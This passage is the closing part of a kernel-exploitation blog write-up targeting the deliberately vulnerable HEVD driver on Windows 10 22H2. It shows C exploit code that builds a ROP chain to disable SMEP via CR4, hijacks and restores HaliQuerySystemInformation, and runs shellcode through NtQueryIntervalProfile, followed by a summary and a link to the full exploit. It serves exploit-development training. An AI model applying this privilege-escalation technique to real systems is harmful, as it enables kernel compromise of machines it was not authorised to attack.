		<span class="n">WriteWhereWhat</span><span class="p">(</span><span class="n">hFile</span><span class="p">,</span> <span class="p">(</span><span class="n">SIZE_T</span><span class="p">)</span><span class="n">BufferLocation</span> <span class="o">+</span> <span class="p">(</span><span class="n">offset</span> <span class="o">+=</span> <span class="mh">0x8</span><span class="p">),</span> <span class="n">AddPtrOffset</span><span class="p">(</span><span class="n">KernelBase</span><span class="p">,</span> <span class="mh">0x9a63e3</span><span class="p">));</span> <span class="c1">// mov cr4, rcx; ret; (1 found)</span>

		<span class="c1">// Restore HaliQuerySystemInformation</span>
		<span class="n">WriteWhereWhat</span><span class="p">(</span><span class="n">hFile</span><span class="p">,</span> <span class="p">(</span><span class="n">SIZE_T</span><span class="p">)</span><span class="n">BufferLocation</span> <span class="o">+</span> <span class="p">(</span><span class="n">offset</span> <span class="o">+=</span> <span class="mh">0x8</span><span class="p">),</span> <span class="n">AddPtrOffset</span><span class="p">(</span><span class="n">KernelBase</span><span class="p">,</span> <span class="mh">0x57adf1</span><span class="p">));</span> <span class="c1">// pop rcx; ret; (1 found)</span>
		<span class="n">WriteWhereWhat</span><span class="p">(</span><span class="n">hFile</span><span class="p">,</span> <span class="p">(</span><span class="n">SIZE_T</span><span class="p">)</span><span class="n">BufferLocation</span> <span class="o">+</span> <span class="p">(</span><span class="n">offset</span> <span class="o">+=</span> <span class="mh">0x8</span><span class="p">),</span> <span class="n">AddPtrOffset</span><span class="p">(</span><span class="n">KernelBase</span><span class="p">,</span> <span class="mh">0x098f9d0</span><span class="p">));</span> <span class="c1">// Address of the HaliQuerySystemInformation function</span>
		<span class="n">WriteWhereWhat</span><span class="p">(</span><span class="n">hFile</span><span class="p">,</span> <span class="p">(</span><span class="n">SIZE_T</span><span class="p">)</span><span class="n">BufferLocation</span> <span class="o">+</span> <span class="p">(</span><span class="n">offset</span> <span class="o">+=</span> <span class="mh">0x8</span><span class="p">),</span> <span class="n">AddPtrOffset</span><span class="p">(</span><span class="n">KernelBase</span><span class="p">,</span> <span class="mh">0x5e602d</span><span class="p">));</span> <span class="c1">// pop rdx; ret; (1 found)</span>
		<span class="n">WriteWhereWhat</span><span class="p">(</span><span class="n">hFile</span><span class="p">,</span> <span class="p">(</span><span class="n">SIZE_T</span><span class="p">)</span><span class="n">BufferLocation</span> <span class="o">+</span> <span class="p">(</span><span class="n">offset</span> <span class="o">+=</span> <span class="mh">0x8</span><span class="p">),</span> <span class="n">HaliQuerySystemInformationAddress</span><span class="p">);</span> <span class="c1">// Location where HaliQuerySystemInformation should be</span>
		<span class="n">WriteWhereWhat</span><span class="p">(</span><span class="n">hFile</span><span class="p">,</span> <span class="p">(</span><span class="n">SIZE_T</span><span class="p">)</span><span class="n">BufferLocation</span> <span class="o">+</span> <span class="p">(</span><span class="n">offset</span> <span class="o">+=</span> <span class="mh">0x8</span><span class="p">),</span> <span class="n">AddPtrOffset</span><span class="p">(</span><span class="n">KernelBase</span><span class="p">,</span> <span class="mh">0x7567b8</span><span class="p">));</span> <span class="c1">// xor eax, eax; mov qword[rdx], rcx; ret; (1 found)</span>

		<span class="c1">// Store the JMP RAX</span>
		<span class="n">WriteWhereWhat</span><span class="p">(</span><span class="n">hFile</span><span class="p">,</span> <span class="p">(</span><span class="n">SIZE_T</span><span class="p">)</span><span class="n">BufferLocation</span> <span class="o">+</span> <span class="p">(</span><span class="n">offset</span> <span class="o">+=</span> <span class="mh">0x8</span><span class="p">),</span> <span class="n">AddPtrOffset</span><span class="p">(</span><span class="n">KernelBase</span><span class="p">,</span> <span class="mh">0x5e602d</span><span class="p">));</span> <span class="c1">// pop rdx; ret; (1 found)</span>
		<span class="n">WriteWhereWhat</span><span class="p">(</span><span class="n">hFile</span><span class="p">,</span> <span class="p">(</span><span class="n">SIZE_T</span><span class="p">)</span><span class="n">BufferLocation</span> <span class="o">+</span> <span class="p">(</span><span class="n">offset</span> <span class="o">+=</span> <span class="mh">0x8</span><span class="p">),</span> <span class="n">AddPtrOffset</span><span class="p">(</span><span class="n">KernelBase</span><span class="p">,</span> <span class="mh">0x523fe0</span><span class="p">));</span> <span class="c1">// jmp rax ; (1 found)</span>

		<span class="c1">// Exec shellcode</span>
		<span class="n">WriteWhereWhat</span><span class="p">(</span><span class="n">hFile</span><span class="p">,</span> <span class="p">(</span><span class="n">SIZE_T</span><span class="p">)</span><span class="n">BufferLocation</span> <span class="o">+</span> <span class="p">(</span><span class="n">offset</span> <span class="o">+=</span> <span class="mh">0x8</span><span class="p">),</span> <span class="n">ShellcodeBuffer</span><span class="p">);</span> <span class="c1">// Jump to our shellcode</span>

		<span class="c1">// Set RSI to the RsiBufferLocation</span>
		<span class="n">SetRSI</span><span class="p">(</span><span class="n">RsiBufferLocation</span><span class="p">);</span>

		<span class="k">typedef</span> <span class="kt">void</span> <span class="p">(</span><span class="o">*</span><span class="n">PtrNtQueryIntervalProfile</span><span class="p">)(</span><span class="n">PVOID</span> <span class="n">arg0</span><span class="p">,</span> <span class="n">PVOID</span> <span class="n">arg1</span><span class="p">);</span>
		<span class="n">HMODULE</span> <span class="n">ntdll</span> <span class="o">=</span> <span class="n">GetModuleHandle</span><span class="p">(</span><span class="n">TEXT</span><span class="p">(</span><span class="s">"ntdll"</span><span class="p">));</span>
		<span class="n">PtrNtQueryIntervalProfile</span> <span class="n">_NtQueryIntervalProfile</span> <span class="o">=</span> <span class="p">(</span><span class="n">PtrNtQueryIntervalProfile</span><span class="p">)</span><span class="n">GetProcAddress</span><span class="p">(</span><span class="n">ntdll</span><span class="p">,</span> <span class="s">"NtQueryIntervalProfile"</span><span class="p">);</span>
		<span class="k">if</span> <span class="p">(</span><span class="n">_NtQueryIntervalProfile</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
			<span class="n">printf</span><span class="p">(</span><span class="s">"[-] Failed to get address of NtQueryIntervalProfile.</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
			<span class="n">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
		<span class="p">}</span>

		<span class="n">printf</span><span class="p">(</span><span class="s">"[*] Calling NtQueryIntervalProfile</span><span class="se">\n\n</span><span class="s">"</span><span class="p">);</span>
		<span class="n">_NtQueryIntervalProfile</span><span class="p">(</span><span class="mh">0xdeadbeefdeadbeef</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">BufferLocation</span><span class="p">);</span>

	<span class="p">}</span>
	<span class="kr">__except</span> <span class="p">(</span><span class="n">EXCEPTION_EXECUTE_HANDLER</span><span class="p">)</span> <span class="p">{</span>
		<span class="n">printf</span><span class="p">(</span><span class="s">"[-] Exception: 0x%X</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">GetLastError</span><span class="p">());</span>
		<span class="n">exit</span><span class="p">(</span><span class="n">EXIT_FAILURE</span><span class="p">);</span>
	<span class="p">}</span>

	<span class="k">return</span> <span class="n">EXIT_SUCCESS</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<h2 id="profit">Profit</h2>
<p><img src="/images/Pasted%20image%2020230714140739.png" alt="" />
Full exploit code can be found here: <a href="https://github.com/0Dr3f/Exploit-Development/tree/main/HEVD">HEVD</a></p>

<h2 id="wrapping-up">Wrapping up</h2>
<p>This post has walked us through the process of exploiting the arbitrary overwrite vulnerability on Windows 10 22H2. The steps involved identifying that <span style="color: #ffffff; background-color: #500000; padding: 2px; border-radius: 3px">nt!HaliQuerySystemInformation</span> was a viable in-direct callable function to use, finding the right ROP gadget in order to gain control over the stack, disabling SMEP in order to execute shellcode, and preventing a BSOD to occur.I want to give special credits to <a href="https://connormcgarr.github.io/">Connor Mcgarr</a> for sharing great knowledge and resources on kernel exploitation &amp; mitigations.</p>


    </div>

    <div class="post__share">
      <div class="share__list">
        <a class="share__link share__facebook" href="https://www.facebook.com/sharer/sharer.php?u=/2023/07/14/HEVD_Win10_22H2_ArbitraryOverwrite/" onclick="window.open(this.href, 'pop-up', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Facebook" rel="nofollow"><i class="ion ion-logo-facebook"></i></a>

        <a class="share__link share__twitter" href="https://twitter.com/intent/tweet?text=HEVD%20on%20Win10%2022H2%20-%20Arbitrary%20Overwrite&url=/2023/07/14/HEVD_Win10_22H2_ArbitraryOverwrite/" onclick="window.open(this.href, 'pop-up', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Twitter" rel="nofollow"><i class="ion ion-logo-twitter"></i></a>

        <a class="share__link share__pinterest" href="http://pinterest.com/pin/create/button/?url=/2023/07/14/HEVD_Win10_22H2_ArbitraryOverwrite/&amp;media=/images/post_01.png&amp;description=HEVD%20on%20Win10%2022H2%20-%20Arbitrary%20Overwrite" onclick="window.open(this.href, 'pop-up', 'left=20,top=20,width=900,height=500,toolbar=1,resizable=0'); return false;" title="Share on Pinterest" rel="nofollow"><i class="ion ion-logo-pinterest"></i></a>
      </div>
    </div>

    <div class="post__navigation">
      
      
      <a class="next" href="/2023/09/10/How_Flawed_Certificate_Handling_Leads_To_Critical_Vulnerabilities/">
        <img class="post__nav-image lazy" data-src="/images/post_02.png" alt="How Flawed Certificate Handling Leads to Critical Vulnerabilities">
        <div class="post__nav-box">
          <div class="post__nav post__nav__next">Next Post <i class="ion ion-md-arrow-forward"></i></div>
          <h4 class="post__nav__title">How Flawed Certificate Handling Leads to Critical Vulnerabilities</h4>
        </div>
      </a>
      
    </div>

  </article>
</div>
<!-- end post -->







<div class="container">
  <div class="related-posts is-related">
    <div class="row">
      <div class="col col-12">
        <div class="container__inner">
          <h3 class="related-title">You may also like</h3>
          <div class="row grid">

          
            
            

            

            

            <div class="article col col-4 col-d-6 col-t-12 grid__post">
              <div class="article__inner">

                
                <a class="article__image" href="/2023/09/10/How_Flawed_Certificate_Handling_Leads_To_Critical_Vulnerabilities/">
                  <img class="lazy" data-src="/images/post_02.png" alt="How Flawed Certificate Handling Leads to Critical Vulnerabilities">
                </a>
                

                <div class="article__content">

                  <div class="article__meta">
                    <span class="article__minutes">
                      
                      
                        5 min read
                      
                      <time class="article__date"
                        datetime="2023-09-10T00:00:00+02:00">Sep 10, 2023</time>
                    </span>
                  </div>

                  <h2 class="article__title">How Flawed Certificate Handling Leads to Critical Vulnerabilities</h2>

                  <p class="article__excerpt">A short post describing 6 unpatched vulnerabilities and how improper certificate handling can lead to critical vulnerabilities</p>

                  <div class="article__bottom">

                    
                    <div class="article__author">
                      <a href="/contact/" aria-label="0Dr3f"><img class="article__author-image lazy" data-src="/images/0Dr3f_logo.png" alt="0Dr3f's Picture"></a>
                    </div>
                    

                    <div class="article__bottom-meta">
                      
                        <a href="/contact/" class="article__author-link">0Dr3f</a>
                      
                      
                      <span>in</span>
                      <span class="article-tags">
                        
                          <a href="/tag/CVE" class="article__tag">CVE</a>
                        
                          <a href="/tag/POC" class="article__tag">POC</a>
                        
                      </span>
                      
                    </div>
                  </div>

                </div>

              </div>
            </div>

            
                
              
            
            
            

            

            
            
          </div>
        </div>
      </div>
    </div>
  </div>
</div>




  </main> 
  <!-- end content -->
  
  <div class="top" title="Top"><i class="ion ion-ios-arrow-up"></i></div>
  <!-- begin footer-widgets -->
<section class="footer-widgets">
  <div class="container">
    <div class="row">
      <div class="col col-4 col-d-6 col-t-12">
  <div class="widget widget-recent">

    <div class="widget__head">
      <h3 class="widget__title">Latest Posts</h3>
    </div>

    
    <div class="recent-posts">
      
      <a class="recent-posts__image" href="/2023/09/10/How_Flawed_Certificate_Handling_Leads_To_Critical_Vulnerabilities/"><img class="lazy" data-src="/images/post_02.png" alt="How Flawed Certificate Handling Leads to Critical Vulnerabilities"></a>
      
      <div class="recent-posts__content">
        <div class="article__meta">
          <span class="article__minutes">
            
            
              5 min read
            
          </span>
          <time class="article__date"
            datetime="2023-09-10T00:00:00+02:00">Sep 10, 2023</time>
        </div>
        <h4 class="recent-posts__title"><a href="/2023/09/10/How_Flawed_Certificate_Handling_Leads_To_Critical_Vulnerabilities/">How Flawed Certificate Handling Leads to Critical Vulnerabilities</a></h4>
        <div class="article__bottom">
          <div class="article__author">
            <a href="/contact/" aria-label="0Dr3f"><img class="article__author-image lazy" data-src="/images/0Dr3f_logo.png" alt="0Dr3f's Picture"></a>
          </div>
          <div class="article__bottom-meta">
            <a href="/contact/" class="article__author-link">0Dr3f</a>
          </div>
        </div>
      </div>
    </div>
    
    <div class="recent-posts">
      
      <a class="recent-posts__image" href="/2023/07/14/HEVD_Win10_22H2_ArbitraryOverwrite/"><img class="lazy" data-src="/images/post_01.png" alt="HEVD on Win10 22H2 - Arbitrary Overwrite"></a>
      
      <div class="recent-posts__content">
        <div class="article__meta">
          <span class="article__minutes">
            
            
              38 min read
            
          </span>
          <time class="article__date"
            datetime="2023-07-14T15:40:00+02:00">Jul 14, 2023</time>
        </div>
        <h4 class="recent-posts__title"><a href="/2023/07/14/HEVD_Win10_22H2_ArbitraryOverwrite/">HEVD on Win10 22H2 - Arbitrary Overwrite</a></h4>
        <div class="article__bottom">
          <div class="article__author">
            <a href="/contact/" aria-label="0Dr3f"><img class="article__author-image lazy" data-src="/images/0Dr3f_logo.png" alt="0Dr3f's Picture"></a>
          </div>
          <div class="article__bottom-meta">
            <a href="/contact/" class="article__author-link">0Dr3f</a>
          </div>
        </div>
      </div>
    </div>
    

  </div>
</div>

      
<div class="col col-4 col-d-6 col-t-12">
  <div class="widget widget-tag-cloud">
    <div class="widget__head">
      <h3 class="widget__title">Explore Tags</h3>
    </div>
    <div class="tag__cloud">
      <a href="/tag/cve/" class="set-1">CVE</a> <a href="/tag/kernel/" class="set-1">KERNEL</a> <a href="/tag/poc/" class="set-5">POC</a>
    </div>
  </div>
</div>

      
    </div>
  </div>
</section>
<!-- end footer-widgets -->

<!-- begin footer -->
<footer class="footer">
  <div class="container">
    <div class="row">
      <div class="col col-12">
      <div class="footer__inner">
        <div class="copyright">2024 &copy; <a href="/">0Dr3f</a>.</div>
        
<div class="social">
  <ul class="social__list list-reset">
    
    <li class="social__item">
      <a class="social__link" href="https://twitter.com/0Dr3f" aria-label="social icon"><i class="ion ion-logo-twitter"></i></a>
    </li>
    
    <li class="social__item">
      <a class="social__link" href="https://github.com/0Dr3f" aria-label="social icon"><i class="ion ion-logo-github"></i></a>
    </li>
    
  </ul>
</div>

        </div>
      </div>
    </div>
  </div>
</footer>
<!-- end footer -->

  <script src="/js/vendors/jquery-3.5.1.min.js"></script>
<script src="/js/vendors/simple-jekyll-search.min.js"></script>
<script src="/js/vendors/jquery.fitvids.js"></script>
<script src="/js/vendors/lazyload.min.js"></script>
<script src="/js/vendors/transition.js"></script>
<script src="/js/vendors/zoom.min.js"></script>
<script src="/js/common.js"></script>
<script>
  var base_url = "",
    pagination_next_url = base_url + '/page2',
    pagination_next_page_number = '',
    pagination_available_pages_number = '';
</script>
</body>

</html>